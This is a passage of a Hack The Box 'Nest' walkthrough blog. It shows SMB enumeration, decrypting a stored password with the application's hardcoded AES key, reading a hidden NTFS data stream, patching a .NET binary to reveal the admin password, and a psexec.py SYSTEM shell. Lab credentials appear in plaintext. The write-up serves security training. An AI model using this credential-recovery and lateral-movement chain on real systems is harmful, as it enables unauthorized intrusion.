$ tree
.
├── IT
│   ├── Archive
│   ├── Configs
│   │   ├── Adobe
│   │   │   ├── editing.xml
│   │   │   ├── Options.txt
│   │   │   ├── projects.xml
│   │   │   └── settings.xml
│   │   ├── Atlas
│   │   │   └── Temp.XML
│   │   ├── DLink
│   │   ├── Microsoft
│   │   │   └── Options.xml
│   │   ├── NotepadPlusPlus
│   │   │   ├── config.xml
│   │   │   └── shortcuts.xml
│   │   ├── RU Scanner
│   │   │   └── RU_config.xml
│   │   └── Server Manager
│   ├── Installs
│   ├── Reports
│   └── Tools
├── Production
├── Reports
└── Shared
    ├── Maintenance
    │   └── Maintenance Alerts.txt
    └── Templates
        ├── HR
        │   └── Welcome Email.txt
        └── Marketing
</code></pre></div><p>Notepad++ config on <code>Data/IT/Configs/NotepadPlusPlus/config.xml</code> contains interesting path.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml>...<span class=nt>&lt;SNIP&gt;</span>...
    <span class=nt>&lt;History</span> <span class=na>nbMaxFile=</span><span class=s>&#34;15&#34;</span> <span class=na>inSubMenu=</span><span class=s>&#34;no&#34;</span> <span class=na>customLength=</span><span class=s>&#34;-1&#34;</span><span class=nt>&gt;</span>
        <span class=nt>&lt;File</span> <span class=na>filename=</span><span class=s>&#34;C:\windows\System32\drivers\etc\hosts&#34;</span> <span class=nt>/&gt;</span>
        <span class=nt>&lt;File</span> <span class=na>filename=</span><span class=s>&#34;\\HTB-NEST\Secure$\IT\Carl\Temp.txt&#34;</span> <span class=nt>/&gt;</span>
        <span class=nt>&lt;File</span> <span class=na>filename=</span><span class=s>&#34;C:\Users\C.Smith\Desktop\todo.txt&#34;</span> <span class=nt>/&gt;</span>
    <span class=nt>&lt;/History&gt;</span>
<span class=nt>&lt;/NotepadPlus&gt;</span>
</code></pre></div><p>Next, on <code>/Data/IT/Configs/RU Scanner/RU_config.xml</code>, I found a password that belongs to c.smith</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml>→ root@iamf «RU Scanner» «192.168.43.234»
$ cat RU_config.xml
<span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span class=nt>&lt;ConfigFile</span> <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class=na>xmlns:xsd=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span class=nt>&gt;</span>
  <span class=nt>&lt;Port&gt;</span>389<span class=nt>&lt;/Port&gt;</span>
  <span class=nt>&lt;Username&gt;</span>c.smith<span class=nt>&lt;/Username&gt;</span>
  <span class=nt>&lt;Password&gt;</span>fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=<span class=nt>&lt;/Password&gt;</span>
<span class=nt>&lt;/ConfigFile&gt;</span>
</code></pre></div><p>It looks like a base64 encoded at first, but it is encrypted:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «RU Scanner» «192.168.43.234»
$ <span class=nb>echo</span> <span class=s1>&#39;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#39;</span> <span class=p>|</span> base64 -d
<span class=o>}</span>13☺□♥□<span class=o>=</span>X□J□BA□↓☺X*□Wc□f□□□?βc◄
</code></pre></div><h4 id=secure-share>Secure$ share<a class=anchor aria-hidden=true href=#secure-share>#</a></h4>
<p>User carl doesn&rsquo;t appear on my enumeration with <code>rpcclient</code>, so after discovering this path <code>\\HTB-NEST\Secure$\IT\Carl\</code>, I went back to <code>Secure$</code> share and performed a recursive download there.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «Data» «192.168.43.234»
$ smbget -R smb://10.10.10.178/Secure$/IT/Carl/ -U TempUser
</code></pre></div><p>Here is the <code>Secure$</code> structure.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «Secure$» «192.168.43.234»
$ tree
.
├── Docs
│   ├── ip.txt
│   └── mmc.txt
├── Reports
└── VB Projects
    ├── Production
    └── WIP
        └── RU
            ├── RUScanner
            │   ├── bin
            │   │   ├── Debug
            │   │   └── Release
            │   ├── ConfigFile.vb
            │   ├── Module1.vb
            │   ├── My Project
            │   │   ├── Application.Designer.vb
            │   │   ├── Application.myapp
            │   │   ├── AssemblyInfo.vb
            │   │   ├── Resources.Designer.vb
            │   │   ├── Resources.resx
            │   │   ├── Settings.Designer.vb
            │   │   └── Settings.settings
            │   ├── obj
            │   │   └── x86
            │   ├── RU Scanner.vbproj
            │   ├── RU Scanner.vbproj.user
            │   ├── SsoIntegration.vb
            │   └── Utils.vb
            └── RUScanner.sln
</code></pre></div><p>I just downloaded a VB Project. Based on <code>Module1.vb</code>&rsquo;s content, <code>RU_config.xml</code> is loaded to the application, and from this line <code>.Password = Utils.DecryptString(Config.Password)</code>, I know this application able to decrypt <code>c.smith</code>&rsquo;s password.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-vb data-lang=vb><span class=err>→</span> <span class=n>root</span><span class=err>@</span><span class=n>iamf</span> <span class=err>«</span><span class=n>WIP</span><span class=err>»</span> <span class=err>«</span><span class=n>192</span><span class=p>.</span><span class=n>168</span><span class=p>.</span><span class=n>43</span><span class=p>.</span><span class=n>234</span><span class=err>»</span>
<span class=err>$</span> <span class=n>cat</span> <span class=n>RU</span><span class=o>/</span><span class=n>RUScanner</span><span class=o>/</span><span class=n>Module1</span><span class=p>.</span><span class=n>vb</span>
<span class=k>Module</span> <span class=nn>Module1</span>

    <span class=k>Sub</span> <span class=nf>Main</span><span class=p>()</span>
        <span class=k>Dim</span> <span class=n>Config</span> <span class=ow>As</span> <span class=n>ConfigFile</span> <span class=o>=</span> <span class=n>ConfigFile</span><span class=p>.</span><span class=n>LoadFromFile</span><span class=p>(</span><span class=s>&#34;RU_Config.xml&#34;</span><span class=p>)</span>
        <span class=k>Dim</span> <span class=n>test</span> <span class=ow>As</span> <span class=k>New</span> <span class=n>SsoIntegration</span> <span class=k>With</span> <span class=p>{.</span><span class=n>Username</span> <span class=o>=</span> <span class=n>Config</span><span class=p>.</span><span class=n>Username</span><span class=p>,</span> <span class=p>.</span><span class=n>Password</span> <span class=o>=</span> <span class=n>Utils</span><span class=p>.</span><span class=n>DecryptString</span><span class=p>(</span><span class=n>Config</span><span class=p>.</span><span class=n>Password</span><span class=p>)}</span>

    <span class=k>End</span> <span class=k>Sub</span>

<span class=k>End</span> <span class=k>Module</span>
</code></pre></div><h2 id=foothold>Foothold<a class=anchor aria-hidden=true href=#foothold>#</a></h2>
<h3 id=access-as-csmith>Access as c.smith<a class=anchor aria-hidden=true href=#access-as-csmith>#</a></h3>
<h4 id=decrypting-csmith-password>Decrypting c.smith password<a class=anchor aria-hidden=true href=#decrypting-csmith-password>#</a></h4>
<p>The encrypted password can be decrypted easily by taking out the utils class and the decrypt function from <code>Utils.vb</code>, then call it on the main function. I used <a href=https://dotnetfiddle.net/>https://dotnetfiddle.net/</a> for this.</p>
<p>Here is how it looks like.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-vb data-lang=vb><span class=k>Imports</span> <span class=nn>System</span>
<span class=k>Imports</span> <span class=nn>System.Text</span>
<span class=k>Imports</span> <span class=nn>System.Security.Cryptography</span>

<span class=k>Public</span> <span class=k>Module</span> <span class=nn>Module1</span>
	<span class=k>Public</span> <span class=k>Sub</span> <span class=nf>Main</span><span class=p>()</span>
		<span class=k>Dim</span> <span class=n>encryptedPassword</span>
		<span class=n>encryptedPassword</span> <span class=o>=</span> <span class=s>&#34;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&#34;</span>
		<span class=n>Console</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=s>&#34;Decrypted Password: &#34;</span> <span class=o>+</span><span class=n>Utils</span><span class=p>.</span><span class=n>DecryptString</span><span class=p>(</span><span class=n>encryptedPassword</span><span class=p>))</span>
	<span class=k>End</span> <span class=k>Sub</span>
<span class=k>End</span> <span class=k>Module</span>


<span class=k>Public</span> <span class=k>Class</span> <span class=nc>Utils</span>
    <span class=k>Public</span> <span class=k>Shared</span> <span class=k>Function</span> <span class=nf>DecryptString</span><span class=p>(</span><span class=n>EncryptedString</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>)</span> <span class=ow>As</span> <span class=kt>String</span>
        <span class=k>If</span> <span class=kt>String</span><span class=p>.</span><span class=n>IsNullOrEmpty</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>)</span> <span class=k>Then</span>
            <span class=k>Return</span> <span class=kt>String</span><span class=p>.</span><span class=n>Empty</span>
        <span class=k>Else</span>
            <span class=k>Return</span> <span class=n>Decrypt</span><span class=p>(</span><span class=n>EncryptedString</span><span class=p>,</span> <span class=s>&#34;N3st22&#34;</span><span class=p>,</span> <span class=s>&#34;88552299&#34;</span><span class=p>,</span> <span class=n>2</span><span class=p>,</span> <span class=s>&#34;464R5DFA5DL6LE28&#34;</span><span class=p>,</span> <span class=n>256</span><span class=p>)</span>
        <span class=k>End</span> <span class=k>If</span>
    <span class=k>End</span> <span class=k>Function</span>
    <span class=k>Public</span> <span class=k>Shared</span> <span class=k>Function</span> <span class=nf>Decrypt</span><span class=p>(</span><span class=k>ByVal</span> <span class=n>cipherText</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
                                   <span class=k>ByVal</span> <span class=n>passPhrase</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
                                   <span class=k>ByVal</span> <span class=n>saltValue</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
                                    <span class=k>ByVal</span> <span class=n>passwordIterations</span> <span class=ow>As</span> <span class=kt>Integer</span><span class=p>,</span> _
                                   <span class=k>ByVal</span> <span class=n>initVector</span> <span class=ow>As</span> <span class=kt>String</span><span class=p>,</span> _
                                   <span class=k>ByVal</span> <span class=n>keySize</span> <span class=ow>As</span> <span class=kt>Integer</span><span class=p>)</span> _
                           <span class=ow>As</span> <span class=kt>String</span>

        <span class=k>Dim</span> <span class=n>initVectorBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
        <span class=n>initVectorBytes</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>initVector</span><span class=p>)</span>

        <span class=k>Dim</span> <span class=n>saltValueBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
        <span class=n>saltValueBytes</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=n>saltValue</span><span class=p>)</span>

        <span class=k>Dim</span> <span class=n>cipherTextBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
        <span class=n>cipherTextBytes</span> <span class=o>=</span> <span class=n>Convert</span><span class=p>.</span><span class=n>FromBase64String</span><span class=p>(</span><span class=n>cipherText</span><span class=p>)</span>

        <span class=k>Dim</span> <span class=n>password</span> <span class=ow>As</span> <span class=k>New</span> <span class=n>Rfc2898DeriveBytes</span><span class=p>(</span><span class=n>passPhrase</span><span class=p>,</span> _
                                           <span class=n>saltValueBytes</span><span class=p>,</span> _
                                           <span class=n>passwordIterations</span><span class=p>)</span>

        <span class=k>Dim</span> <span class=n>keyBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
        <span class=n>keyBytes</span> <span class=o>=</span> <span class=n>password</span><span class=p>.</span><span class=n>GetBytes</span><span class=p>(</span><span class=k>CInt</span><span class=p>(</span><span class=n>keySize</span> <span class=o>/</span> <span class=n>8</span><span class=p>))</span>

        <span class=k>Dim</span> <span class=n>symmetricKey</span> <span class=ow>As</span> <span class=k>New</span> <span class=n>AesCryptoServiceProvider</span>
        <span class=n>symmetricKey</span><span class=p>.</span><span class=n>Mode</span> <span class=o>=</span> <span class=n>CipherMode</span><span class=p>.</span><span class=n>CBC</span>

        <span class=k>Dim</span> <span class=n>decryptor</span> <span class=ow>As</span> <span class=n>ICryptoTransform</span>
        <span class=n>decryptor</span> <span class=o>=</span> <span class=n>symmetricKey</span><span class=p>.</span><span class=n>CreateDecryptor</span><span class=p>(</span><span class=n>keyBytes</span><span class=p>,</span> <span class=n>initVectorBytes</span><span class=p>)</span>

        <span class=k>Dim</span> <span class=n>memoryStream</span> <span class=ow>As</span> <span class=n>IO</span><span class=p>.</span><span class=n>MemoryStream</span>
        <span class=n>memoryStream</span> <span class=o>=</span> <span class=k>New</span> <span class=n>IO</span><span class=p>.</span><span class=n>MemoryStream</span><span class=p>(</span><span class=n>cipherTextBytes</span><span class=p>)</span>

        <span class=k>Dim</span> <span class=n>cryptoStream</span> <span class=ow>As</span> <span class=n>CryptoStream</span>
        <span class=n>cryptoStream</span> <span class=o>=</span> <span class=k>New</span> <span class=n>CryptoStream</span><span class=p>(</span><span class=n>memoryStream</span><span class=p>,</span> _
                                        <span class=n>decryptor</span><span class=p>,</span> _
                                        <span class=n>CryptoStreamMode</span><span class=p>.</span><span class=n>Read</span><span class=p>)</span>

        <span class=k>Dim</span> <span class=n>plainTextBytes</span> <span class=ow>As</span> <span class=kt>Byte</span><span class=p>()</span>
        <span class=k>ReDim</span> <span class=n>plainTextBytes</span><span class=p>(</span><span class=n>cipherTextBytes</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>

        <span class=k>Dim</span> <span class=n>decryptedByteCount</span> <span class=ow>As</span> <span class=kt>Integer</span>
        <span class=n>decryptedByteCount</span> <span class=o>=</span> <span class=n>cryptoStream</span><span class=p>.</span><span class=n>Read</span><span class=p>(</span><span class=n>plainTextBytes</span><span class=p>,</span> _
                                               <span class=n>0</span><span class=p>,</span> _
                                               <span class=n>plainTextBytes</span><span class=p>.</span><span class=n>Length</span><span class=p>)</span>

        <span class=n>memoryStream</span><span class=p>.</span><span class=n>Close</span><span class=p>()</span>
        <span class=n>cryptoStream</span><span class=p>.</span><span class=n>Close</span><span class=p>()</span>

        <span class=k>Dim</span> <span class=n>plainText</span> <span class=ow>As</span> <span class=kt>String</span>
        <span class=n>plainText</span> <span class=o>=</span> <span class=n>Encoding</span><span class=p>.</span><span class=n>ASCII</span><span class=p>.</span><span class=n>GetString</span><span class=p>(</span><span class=n>plainTextBytes</span><span class=p>,</span> _
                                            <span class=n>0</span><span class=p>,</span> _
                                            <span class=n>decryptedByteCount</span><span class=p>)</span>
        <span class=k>Return</span> <span class=n>plainText</span>
    <span class=k>End</span> <span class=k>Function</span>
<span class=k>End</span> <span class=k>Class</span>
</code></pre></div><p>Now I have <code>c.smith</code>&rsquo;s password, <code>xRxRxPANCAK3SxRxRx</code></p>
<p><div class=img-container><img src=imgs/image-20210416080029703.png alt=image-20210416080029703></div>
</p>
<h4 id=users-share>Users share<a class=anchor aria-hidden=true href=#users-share>#</a></h4>
<p>With <code>c.smith</code> credentials, I do more enumeration on SMB. First, I&rsquo;ll look into the <code>c.smith</code> home directory.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «smb» «192.168.43.234»
$ smbclient -U <span class=s1>&#39;c.smith%xRxRxPANCAK3SxRxRx&#39;</span> //10.10.10.178/Users 
Try <span class=s2>&#34;help&#34;</span> to get a list of possible commands.
smb: <span class=se>\C</span>.Smith<span class=se>\&gt;</span> dir
  .                                   D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 02:21:44 <span class=m>2020</span>
  ..                                  D        <span class=m>0</span>  Sun Jan <span class=m>26</span> 02:21:44 <span class=m>2020</span>
  HQK Reporting                       D        <span class=m>0</span>  Thu Aug  <span class=m>8</span> 19:06:17 <span class=m>2019</span>
  user.txt                            A       <span class=m>32</span>  Thu Aug  <span class=m>8</span> 19:05:24 <span class=m>2019</span>
</code></pre></div><p>I downloaded those files recursively to my machine.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «c.smith» «192.168.43.234»
$ tree
.
├── HQK Reporting
│   ├── AD Integration Module
│   │   └── HqkLdap.exe
│   ├── Debug Mode Password.txt
│   └── HQK_Config_Backup.xml
└── user.txt
</code></pre></div><p><code>user.txt</code> is the user flag.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «c.smith» «192.168.43.234»
$ cat user.txt
cf71b25404be5d84fd827e05f426e987
</code></pre></div><p><code>HQK_Config_Backup.xml</code> doesn&rsquo;t contains any useful information</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-xml data-lang=xml>→ root@iamf «c.smith» «192.168.43.234»
$ cat HQK\ Reporting/HQK_Config_Backup.xml
<span class=cp>&lt;?xml version=&#34;1.0&#34;?&gt;</span>
<span class=nt>&lt;ServiceSettings</span> <span class=na>xmlns:xsi=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema-instance&#34;</span> <span class=na>xmlns:xsd=</span><span class=s>&#34;http://www.w3.org/2001/XMLSchema&#34;</span><span class=nt>&gt;</span>
  <span class=nt>&lt;Port&gt;</span>4386<span class=nt>&lt;/Port&gt;</span>
  <span class=nt>&lt;QueryDirectory&gt;</span>C:\Program Files\HQK\ALL QUERIES<span class=nt>&lt;/QueryDirectory&gt;</span>
<span class=nt>&lt;/ServiceSettings&gt;</span>
</code></pre></div><p><code>Debug Mode Password.txt</code> is empty file. But when I thought it was empty, I asked a hint for this.</p>
<p>This file is embedded with Alternate Data Stream (ADS). By using the <code>allinfo</code> command on the SMB, I can see it contains another data stream, <code>Password:$Data</code>.</p>
<p><div class=img-container><img src=imgs/image-20210525005607779.png alt=image-20210525005607779></div>
</p>
<p>To get that stream, I can just append <code>:Password:$Data</code> at the end of the file name.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>smb: <span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\&gt;</span> allinfo <span class=s2>&#34;Debug Mode Password.txt&#34;</span>
altname: DEBUGM~1.TXT
create_time:    Thu Aug  <span class=m>8</span> 07:06:12 PM <span class=m>2019</span> EDT
access_time:    Thu Aug  <span class=m>8</span> 07:06:12 PM <span class=m>2019</span> EDT
write_time:     Thu Aug  <span class=m>8</span> 07:08:17 PM <span class=m>2019</span> EDT
change_time:    Thu Aug  <span class=m>8</span> 07:08:17 PM <span class=m>2019</span> EDT
attributes: A <span class=o>(</span>20<span class=o>)</span>
stream: <span class=o>[</span>::<span class=nv>$DATA</span><span class=o>]</span>, <span class=m>0</span> bytes
stream: <span class=o>[</span>:Password:<span class=nv>$DATA</span><span class=o>]</span>, <span class=m>15</span> bytes
smb: <span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\&gt;</span> get <span class=s2>&#34;Debug Mode Password.txt&#34;</span>:Password:<span class=nv>$DATA</span>
getting file <span class=se>\C</span>.Smith<span class=se>\H</span>QK Reporting<span class=se>\D</span>ebug Mode Password.txt:Password:<span class=nv>$DATA</span> of size <span class=m>15</span> as Debug Mode Password.txt:Password:<span class=nv>$DATA</span> <span class=o>(</span>0.0 KiloBytes/sec<span class=o>)</span> <span class=o>(</span>average 0.0 KiloBytes/sec<span class=o>)</span>
</code></pre></div><p>Now I can use the <code>cat</code> command to see the file content.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «c.smith» «192.168.43.234»
$ cat Debug<span class=se>\ </span>Mode<span class=se>\ </span>Password.txt:Password:<span class=se>\$</span>DATA
WBQ201953D8w
</code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2>
<h3 id=shell-as-nt-authoritysystem>Shell as NT Authority\System<a class=anchor aria-hidden=true href=#shell-as-nt-authoritysystem>#</a></h3>
<h4 id=examination-on-hqk-reporting-service-v12>Examination on HQK Reporting Service v1.2<a class=anchor aria-hidden=true href=#examination-on-hqk-reporting-service-v12>#</a></h4>
<p>When visiting <code>http://10.10.10.178:4386/</code>, the browser return a session timeout with <code>></code> symbol, this could imply that this service is cli-based</p>
<p>With <code>telnet</code>, I could access this service.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «c.smith» «192.168.43.234»
$ telnet 10.10.10.178 <span class=m>4386</span>
</code></pre></div><p><img src=imgs/image-20210416083748311.png alt=image-20210416083748311 style=zoom:80%></p>
<p>With debug mode enabled, it shows more commands.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text>&gt;debug WBQ201953D8w
</code></pre></div><p><img src=imgs/image-20210416083637321.png alt=image-20210416083637321 style=zoom:80%></p>
<p>Took me a minute to understand the commands, so basically</p>
<ul>
<li>LIST is to list directory,</li>
<li>SHOWQUERY is to show file content,</li>
<li>RUNQUERY is to execute.</li>
<li>SETDIR is change directory.</li>
</ul>
<p>Looking up into the LDAP directory, there&rsquo;s <code>ldap.conf</code> that contains administrator credentials with another encrypted password.</p>
<p><div class=img-container><img src=https://cdn-images-1.medium.com/max/1000/1*0FINadW8yhptF6wzvidgsw.png alt=img></div>
</p>
<p>I have a copy of <code>HqkLdap.exe</code> on <code>c.smith</code>&rsquo;s loot directory. So I decided to copy HqkLdap.exe from Kali to Windows and inspect the binary.I also created a copy of <code>Ldap.conf</code>.</p>
<h4 id=reversing-hqkldapexe>Reversing HQKLdap.exe<a class=anchor aria-hidden=true href=#reversing-hqkldapexe>#</a></h4>
<p>Running <code>strings</code> <code>HqkLdap.exe</code> againts the app, I discovered that it was built with.NET, and there are no hard-coded credentials.</p>
<p><img src=imgs/image-20210416085451866.png alt=image-20210416085451866 style=zoom:80%></p>
<p>Using immunity/ollydbg is waste of time because I can’t really read assembly, instead I have a very useful tool for reversing and debugging .NET applications called <code>dnSpy</code>. It&rsquo;s free on Github.</p>
<ul>
<li>dnSpy: <a href=https://github.com/0xd4d/dnSpy/releases>https://github.com/0xd4d/dnSpy/releases</a></li>
</ul>
<p>For this I&rsquo;ll go straight to the application main function.</p>
<p><div class=img-container><img src=https://cdn-images-1.medium.com/max/1000/1*W6q1GITk1OTtrEmoVEX98A.png alt=img></div>
</p>
<p>To run this program properly, a config file, which is <code>ldap.conf</code>, must be served as an argument to the application, and it also needs the presences of <code>HqkDbImport.exe</code> (These two must exist in the same folder)</p>
<p><img src=imgs/image-20210416091107297.png alt=image-20210416091107297 style=zoom:80%></p>
<p>So if I run it and I don&rsquo;t fulfill the check, it will complain like this:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=nb>PS </span><span class=n>C:</span><span class=p>\</span><span class=n>Users</span><span class=p>\</span><span class=n>fahmi</span><span class=p>\</span><span class=n>Desktop</span><span class=p>&gt;.\</span><span class=n>HqkLdap</span><span class=p>.</span><span class=n>exe</span> <span class=n>Ldap</span><span class=p>.</span><span class=n>conf</span>
<span class=n>Please</span> <span class=n>ensure</span> <span class=n>the</span> <span class=n>optional</span> <span class=n>database</span> <span class=n>import</span> <span class=n>module</span> <span class=n>is</span> <span class=n>installed</span>
</code></pre></div><p>Next, I investigated the decrypt function, which was called on the main after the checks were completed.</p>
<p><div class=img-container><img src=https://cdn-images-1.medium.com/max/1000/1*DoxZojo9U_5FVmtJBydPsg.png alt=img></div>
</p>
<p>On the next block, I see <code>ldapSearchSettings.Password</code> is assigned to <code>ldap.password</code></p>
<p><div class=img-container><img src=https://cdn-images-1.medium.com/max/1000/1*B-sjrlUthEkQ0d6o855QMw.png alt=img></div>
</p>
<p>From here, what I can try is:</p>
<ul>
<li>Remove the part of codes that used to check for the existence of <code>HqkDbImport.exe</code></li>
<li>Add another line to print out the password from <code>ldap.Password</code>.</li>
</ul>
<p>I&rsquo;ll use the edit feature to edit the main class.</p>
<p><img src=imgs/image-20210416093818613.png alt=image-20210416093818613 style=zoom:80%></p>
<p>Also, I’ll get rid the line that used to check the existence of <code>HqkDbImport.exe</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-c# data-lang=c#><span class=k>public</span> <span class=k>static</span> <span class=k>void</span> <span class=n>Main</span><span class=p>()</span>
<span class=p>{</span>
  <span class=k>checked</span>
  <span class=p>{</span> 
    <span class=k>try</span>
    <span class=p>{</span>
      <span class=k>if</span> <span class=p>(</span><span class=n>MyProject</span><span class=p>.</span><span class=n>Application</span><span class=p>.</span><span class=n>CommandLineArgs</span><span class=p>.</span><span class=n>Count</span> <span class=p>!=</span> <span class=m>1</span><span class=p>)</span> 
      <span class=p>{</span>
        <span class=n>Console</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=s>&#34;Invalid number of command line arguments&#34;</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=k>else</span> <span class=k>if</span> <span class=p>(!</span><span class=n>File</span><span class=p>.</span><span class=n>Exists</span><span class=p>(</span><span class=n>MyProject</span><span class=p>.</span><span class=n>Application</span><span class=p>.</span><span class=n>CommandLineArgs</span><span class=p>[</span><span class=m>0</span><span class=p>]))</span>
      <span class=p>{</span>
        <span class=n>Console</span><span class=p>.</span><span class=n>WriteLine</span><span class=p>(</span><span class=s>&#34;Specified config file does not exist&#34;</span><span class=p>);</span>
      <span class=p>}</span>
      <span class=k>else</span> <span class=p>{</span>
<span class=p>...&lt;</span><span class=n>snip</span><span class=p>&gt;</span> <span class=p>...</span>
</code></pre></div><p>Then I’ll add a new line code on the main function at line 56 to print <code>ldap.Password</code> to the console.</p>
<p><div class=img-container><img src=https://cdn-images-1.medium.com/max/1000/1*FvxtmqQKLEbY9tECtvRTtw.png alt=img></div>
</p>
<p>I tried to compile it back but then there was an error about the unassigned local variable &lsquo;enumerator&rsquo;, so I deleted that variable and tried to compile it back.</p>
<p><div class=img-container><img src=imgs/image-20210416094537134.png alt=image-20210416094537134></div>
</p>
<p>It succeeded and I can export the modified program.</p>
<p>Now I can just run it and provide the <strong>ldap.conf</strong> as its argument and it works!</p>
<p><div class=img-container><img src=https://cdn-images-1.medium.com/max/1000/1*DWT9GjrNNCYs_YpYY1B8Ug.png alt=img></div>
</p>
<p>The password is: <code>XtH4nkS4Pl4y1nGX</code></p>
<h4 id=psexecpy>psexec.py<a class=anchor aria-hidden=true href=#psexecpy>#</a></h4>
<p>I can gain access as local system on the box using administrator account and the decrypted password with <code>psexec.py</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ root@iamf «c.smith» «192.168.43.234»
$ psexec.py HTB-NEST/Administrator:XtH4nkS4Pl4y1nGX@10.10.10.178
Impacket v0.9.20 - Copyright <span class=m>2019</span> SecureAuth Corporation

<span class=o>[</span>*<span class=o>]</span> Requesting shares on 10.10.10.178.....
<span class=o>[</span>*<span class=o>]</span> Found writable share ADMIN$
<span class=o>[</span>*<span class=o>]</span> Uploading file nQyIIpWk.exe
<span class=o>[</span>*<span class=o>]</span> Opening SVCManager on 10.10.10.178.....
<span class=o>[</span>*<span class=o>]</span> Creating service gfCe on 10.10.10.178.....
<span class=o>[</span>*<span class=o>]</span> Starting service gfCe.....
<span class=o>[</span>!<span class=o>]</span> Press <span class=nb>help</span> <span class=k>for</span> extra shell commands
Microsoft Windows <span class=o>[</span>Version 6.1.7601<span class=o>]</span>
Copyright <span class=o>(</span>c<span class=o>)</span> <span class=m>2009</span> Microsoft Corporation.  All rights reserved.

C:<span class=se>\W</span>indows<span class=se>\s</span>ystem32&gt;whoami
nt authority<span class=se>\s</span>ystem
</code></pre></div><hr>
<h2 id=references>References<a class=anchor aria-hidden=true href=#references>#</a></h2>
<ul>
<li><a href=https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux>https://superuser.com/questions/1520250/read-alternate-data-streams-over-smb-with-linux</a></li>
</ul>
</div>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://fahmifj.github.io/tags/oscp-plus/>OSCP-plus</a></li>
<li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li>
<li><a href=https://fahmifj.github.io/tags/smb/>SMB</a></li>
<li><a href=https://fahmifj.github.io/tags/alternate-data-stream/>Alternate-Data-Stream</a></li>
<li><a href=https://fahmifj.github.io/tags/dotn/>dotN</a></li>
<li><a href=https://fahmifj.github.io/tags/vb/>VB</a></li>
<li><a href=https://fahmifj.github.io/tags/reverse-engineering/>Reverse-engineering</a></li>
<li><a href=https://fahmifj.github.io/tags/dnspy/>dnSpy</a></li>
<li><a href=https://fahmifj.github.io/tags/psexec.py/>psexec.py</a></li>
</ul>
<div class=share-buttons>
